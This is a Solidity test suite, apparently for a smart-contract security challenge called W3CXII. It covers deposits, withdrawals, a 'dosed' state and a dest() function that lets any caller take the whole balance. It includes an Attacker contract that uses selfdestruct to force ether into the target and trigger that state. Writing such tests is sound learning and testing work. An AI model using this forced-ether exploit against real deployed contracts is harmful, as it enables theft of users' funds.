// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {W3CXII} from "../src/W3CXII.sol";

contract W3CXIITest is Test {
    W3CXII public w3cxii;
    Attacker public attacker;
    address user = makeAddr("user");

    function setUp() public {
        deal(msg.sender, 100 ether);
        deal(user, 100 ether);
        vm.prank(msg.sender);
        w3cxii = new W3CXII{value: 1 ether}();
    }

    function test_initialState() public view {
        assertFalse(w3cxii.dosed());
        assertEq(w3cxii.balanceOf(user), 0);
    }

    // DEPOSIT FUNCTION TESTS

    function test_deposit_success() public {
        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        assertEq(w3cxii.balanceOf(user), 0.5 ether);
        assertEq(address(w3cxii).balance, 1.5 ether);
    }

    function test_deposit_incorrectAmount() public {
        vm.prank(user);
        vm.expectRevert("InvalidAmount");
        w3cxii.deposit{value: 0.4 ether}();

        vm.prank(user);
        vm.expectRevert("InvalidAmount");
        w3cxii.deposit{value: 0.6 ether}();
    }

    function test_deposit_zeroAmount() public {
        vm.prank(user);
        vm.expectRevert("InvalidAmount");
        w3cxii.deposit{value: 0 ether}();
    }

    function test_deposit_maxExceeded() public {
        // Reduce initial balance to leave room for testing max user deposit
        vm.deal(address(w3cxii), 0); // Reset contract balance

        // First deposit of 0.5 ether
        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        // Second deposit of 0.5 ether
        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        // Third deposit should revert with user limit exceeded
        vm.prank(user);
        vm.expectRevert("Max deposit exceeded");
        w3cxii.deposit{value: 0.5 ether}();
    }

    function test_deposit_contractBalanceLimit() public {
        // Setup another user
        address user2 = makeAddr("user2");
        deal(user2, 100 ether);

        // First user deposits 0.5 ether
        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        // Contract balance is now 1.5 ether (1 initial + 0.5)
        assertEq(address(w3cxii).balance, 1.5 ether);

        // Second user's deposit would make balance = 2 ether, which should be locked
        vm.prank(user2);
        vm.expectRevert("deposit locked");
        w3cxii.deposit{value: 0.5 ether}();
    }

    function test_deposit_multipleUsers() public {
        // Reset contract balance to allow multiple deposits
        vm.deal(address(w3cxii), 0);

        address user2 = makeAddr("user2");
        deal(user2, 100 ether);

        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        vm.prank(user2);
        w3cxii.deposit{value: 0.5 ether}();

        assertEq(w3cxii.balanceOf(user), 0.5 ether);
        assertEq(w3cxii.balanceOf(user2), 0.5 ether);
    }

    // WITHDRAW FUNCTION TESTS

    function test_withdraw_success() public {
        uint256 initialBalance = user.balance;

        // Setup: deposit first
        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        // Test withdraw
        vm.prank(user);
        w3cxii.withdraw();

        // Verify results
        assertEq(w3cxii.balanceOf(user), 0);
        assertEq(user.balance, initialBalance); // User got their money back
    }

    function test_withdraw_noBalance() public {
        vm.prank(user);
        vm.expectRevert("No deposit");
        w3cxii.withdraw();
    }

    function test_withdraw_afterDosedState() public {
        // First set up dosed state
       test_dosed();

        // Second withdraw should still work but with different behavior
        vm.prank(user);
        w3cxii.withdraw();

        // User's balance should remain the same (no ETH returned)
        assertEq(w3cxii.balanceOf(user), 0.5 ether);
    }

    function test_forceEther() public {
        vm.prank(user);
        attacker = new Attacker{value: 19 ether}(address(w3cxii));
        assertGe(address(w3cxii).balance, 20 ether);
    }

    function test_dosed() public {
        test_deposit_success();
        test_forceEther();
        vm.prank(user);
        w3cxii.withdraw();
        assertTrue(w3cxii.dosed());
    }

    function test_afterAttack() public {
        vm.prank(user);
        attacker = new Attacker{value: 19 ether}(address(w3cxii));
        assertEq(address(attacker).balance, 0);
    }

    // Tests for the dest() function

    function test_dest_success() public {
        // First, get the contract into "dosed" state
        // 1. Deposit some funds
        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        // 2. Force ETH to trigger dosed state
        test_forceEther();

        // 3. Call withdraw to set dosed = true
        vm.prank(user);
        w3cxii.withdraw();

        // Verify the contract is now dosed
        assertTrue(w3cxii.dosed());

        // Record balances before destruction
        uint256 contractBalance = address(w3cxii).balance;
        uint256 userBalanceBefore = user.balance;

        // Call the dest function as user
        vm.prank(user);
        w3cxii.dest();

        // Verify user received the contract's entire balance
        assertEq(user.balance, userBalanceBefore + contractBalance);

        // Verify contract balance is now zero
        assertEq(address(w3cxii).balance, 0);
    }

    function test_dest_notDosed() public {
        // Attempt to call dest when contract is not dosed
        vm.prank(user);
        vm.expectRevert("Not dosed");
        w3cxii.dest();
    }

    function test_dest_anyUserCanCall() public {
        // First, get the contract into "dosed" state using original user
        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        test_forceEther();

        vm.prank(user);
        w3cxii.withdraw();

        // Now a different user can call dest and receive funds
        address anotherUser = makeAddr("anotherUser");
        uint256 anotherUserBalance = anotherUser.balance;
        uint256 contractBalance = address(w3cxii).balance;

        vm.prank(anotherUser);
        w3cxii.dest();

        // Verify the new user received funds
        assertEq(anotherUser.balance, anotherUserBalance + contractBalance);
    }

    function test_dest_afterDestruction() public {
        // First part: Set up dosed state and call dest()
        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        test_forceEther();

        vm.prank(user);
        w3cxii.withdraw();

        // Record balances
        uint256 contractBalance = address(w3cxii).balance;
        uint256 userBalanceBefore = user.balance;

        // Call dest() which will destroy the contract
        vm.prank(user);
        w3cxii.dest();

        // Verify funds were transferred
        assertEq(user.balance, userBalanceBefore + contractBalance);

        // Verify contract balance is now zero
        assertEq(address(w3cxii).balance, 0);

        // Create a new transaction context to ensure destruction
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 15);

        // NOTE: Due to Foundry's implementation, the contract code
        // might still be accessible in tests even after selfdestruct
        // This is a test environment limitation
    }

    // Attacker tests

    function test_attacker_zeroEther() public {
        uint256 balanceBefore = address(w3cxii).balance;

        vm.prank(user);
        attacker = new Attacker{value: 0 ether}(address(w3cxii));

        // Balance should remain unchanged when sending 0 ETH
        assertEq(address(w3cxii).balance, balanceBefore);
    }

    function test_attacker_exactBalanceTransfer() public {
        uint256 balanceBefore = address(w3cxii).balance;
        uint256 attackAmount = 5 ether;

        vm.prank(user);
        attacker = new Attacker{value: attackAmount}(address(w3cxii));

        // Balance should increase by exactly the attack amount
        assertEq(address(w3cxii).balance, balanceBefore + attackAmount);
    }

    function test_attacker_multipleAttacks() public {
        // First make a deposit so we can test withdrawal later
        vm.prank(user);
        w3cxii.deposit{value: 0.5 ether}();

        uint256 balanceBefore = address(w3cxii).balance;

        vm.startPrank(user);

        // First attack
        attacker = new Attacker{value: 5 ether}(address(w3cxii));

        // Second attack with a different amount
        new Attacker{value: 7 ether}(address(w3cxii));

        // Third attack to push over the threshold
        new Attacker{value: 8 ether}(address(w3cxii));

        vm.stopPrank();

        // Balance should increase by sum of all attacks
        assertEq(
            address(w3cxii).balance,
            balanceBefore + 5 ether + 7 ether + 8 ether
        );

        // Check that if a user tries to withdraw after these attacks, the contract goes into dosed state
        // We already made a deposit before the attacks, so no need to deposit again
        vm.prank(user);
        w3cxii.withdraw();

        assertTrue(w3cxii.dosed());
    }

    function test_attacker_nonPayable() public {
        // Test that we cannot send ETH to the attacker after deployment
        // (this should fail since the contract self-destructs immediately)
        vm.prank(user);
        attacker = new Attacker{value: 1 ether}(address(w3cxii));

        vm.deal(address(this), 1 ether);
        vm.expectRevert();
        (bool success, ) = address(attacker).call{value: 1 ether}("");

        assertFalse(success);
    }

    function test_attacker_constructor() public {
        uint256 targetBalance = address(w3cxii).balance;
        uint256 attackAmount = 3 ether;

        // Test the constructor directly
        vm.prank(user);
        new Attacker{value: attackAmount}(address(w3cxii));

        // Verify ETH was transferred to the target
        assertEq(address(w3cxii).balance, targetBalance + attackAmount);

        // Create an instance with zero ETH too (for branch coverage)
        vm.prank(user);
        new Attacker{value: 0}(address(w3cxii));
    }

    function test_withdraw_transferFails() public {
        // Create a contract that rejects ETH
        RevertingContract reverter = new RevertingContract();

        // Fund the reverting contract
        vm.deal(address(reverter), 1 ether);

        // Make deposit from the reverting contract
        vm.prank(address(reverter));
        w3cxii.deposit{value: 0.5 ether}();

        // Try to withdraw (should fail on the ETH transfer)
        vm.prank(address(reverter));
        vm.expectRevert("Transfer failed");
        w3cxii.withdraw();
    }
}

contract Attacker {
    constructor(address w3cxii) payable {
        selfdestruct(payable(w3cxii));
    }
}

contract RevertingContract {
    // Allow receiving ETH when deployed
    constructor() payable {}

    // But reject all subsequent ETH transfers
    receive() external payable {
        revert("No ETH accepted");
    }

    fallback() external payable {
        revert("No ETH accepted");
    }

    // Function to interact with W3CXII
    function callDeposit(W3CXII target) external payable {
        target.deposit{value: msg.value}();
    }

    function callWithdraw(W3CXII target) external {
        target.withdraw();
    }
}
